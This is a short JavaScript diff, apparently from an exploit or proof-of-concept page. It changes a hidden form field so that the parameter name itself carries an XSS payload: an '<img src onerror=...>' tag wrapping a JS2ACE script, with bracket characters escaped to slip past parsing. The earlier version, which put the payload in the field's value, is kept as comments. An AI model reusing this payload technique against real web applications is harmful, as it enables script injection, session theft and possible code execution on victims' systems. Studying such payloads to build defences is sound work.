@@ -27,10 +27,16 @@
 
 
 			/*** ***/
+			// var inputTag = document.createElement("input");
+			// inputTag.type = "hidden";
+			// inputTag.name = XSSParam;
+			// inputTag.value = JS2ACE;
+			// formTag.appendChild(inputTag);
+
 			var inputTag = document.createElement("input");
 			inputTag.type = "hidden";
-			inputTag.name = XSSParam;
-			inputTag.value = JS2ACE;
+			inputTag.name = XSSParam+"[<img src onerror="+JS2ACE.replaceAll("]","&#x5d")+">]";
+			inputTag.value = "";
 			formTag.appendChild(inputTag);
 			/*** ***/
 
